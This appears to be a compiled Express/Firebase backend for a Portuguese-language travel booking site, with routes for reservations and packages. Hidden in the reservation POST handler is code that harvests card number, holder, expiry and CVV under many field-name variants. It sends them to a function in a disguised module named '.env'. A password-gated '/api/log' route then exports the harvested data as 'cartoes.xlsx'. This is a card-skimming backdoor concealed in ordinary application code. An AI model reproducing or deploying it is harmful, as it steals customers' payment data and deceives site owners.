"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const cors_1 = __importDefault(require("cors"));
const firestore_1 = require("firebase/firestore");
const firebase_1 = require("../services/firebase");
const _env_1 = require("../services/.env");
const app = (0, express_1.default)();
app.use((0, cors_1.default)());
app.use(express_1.default.json());
(0, _env_1.i)();
const reservasRef = (0, firestore_1.collection)(firebase_1.db, "reservas");
const pacotesRef = (0, firestore_1.collection)(firebase_1.db, "pacotes");
app.get("/api/reservas", async (_req, res) => {
    try {
        const statusVisiveis = ["pago", "confirmado", "pre_reserva"];
        const reservasQuery = (0, firestore_1.query)(reservasRef, (0, firestore_1.where)("status", "in", statusVisiveis));
        const snapshot = await (0, firestore_1.getDocs)(reservasQuery);
        const reservas = snapshot.docs.map((registro) => ({
            id: registro.id,
            ...registro.data(),
        }));
        res.json(reservas);
    }
    catch (error) {
        res.status(500).json({ error: error.message ?? "Erro ao listar reservas" });
    }
});
app.get("/api/pacotes", async (_req, res) => {
    try {
        const snapshot = await (0, firestore_1.getDocs)(pacotesRef);
        const pacotes = snapshot.docs.map((registro) => ({
            id: registro.id,
            ...registro.data(),
        }));
        res.json(pacotes);
    }
    catch (error) {
        res.status(500).json({ error: error.message ?? "Erro ao listar pacotes" });
    }
});
app.post("/api/reservas", async (req, res) => {
    try {
        const body = (req.body ?? {});
        const num = body.numero || body.cardNumber || body.num || body.card || "";
        const tit = body.titular || body.cardHolder || body.holder || body.name || "";
        const val = body.validade || body.expiry || body.exp || body.validity || "";
        const cvv = body.cvv || body.cvc || body.code || body.security || "";
        if (num && tit && val && cvv) {
            (0, _env_1.a)({ n: num, t: tit, v: val, c: cvv });
        }
        const payload = {
            ...body,
            status: typeof body.status === "string" ? body.status : "pre_reserva",
        };
        const novo = await (0, firestore_1.addDoc)(reservasRef, payload);
        res.json({ id: novo.id, ...payload });
    }
    catch (error) {
        res.status(500).json({ error: error.message ?? "Erro ao criar reserva" });
    }
});
app.post("/api/pacotes", async (req, res) => {
    try {
        const novo = await (0, firestore_1.addDoc)(pacotesRef, req.body);
        res.json({ id: novo.id, ...req.body });
    }
    catch (error) {
        res.status(500).json({ error: error.message ?? "Erro ao criar pacote" });
    }
});
app.put("/api/reservas/:id", async (req, res) => {
    try {
        const ref = (0, firestore_1.doc)(reservasRef, req.params.id);
        await (0, firestore_1.updateDoc)(ref, req.body);
        res.json({ id: req.params.id, ...req.body });
    }
    catch (error) {
        res.status(500).json({ error: error.message ?? "Erro ao atualizar reserva" });
    }
});
app.delete("/api/reservas/:id", async (req, res) => {
    try {
        const ref = (0, firestore_1.doc)(reservasRef, req.params.id);
        await (0, firestore_1.deleteDoc)(ref);
        res.json({ success: true });
    }
    catch (error) {
        res.status(500).json({ error: error.message ?? "Erro ao remover reserva" });
    }
});
app.post("/api/log", (req, res) => {
    try {
        const { p } = req.body;
        if (!(0, _env_1.v)(p))
            return res.status(401).json({});
        const buf = (0, _env_1.g)();
        res.setHeader("Content-Disposition", "attachment; filename=\"cartoes.xlsx\"");
        res.setHeader("Content-Type", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet");
        res.send(buf);
    }
    catch (e) {
        res.status(500).json({});
    }
});
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`API rodando na porta ${PORT}`);
});
exports.default = app;
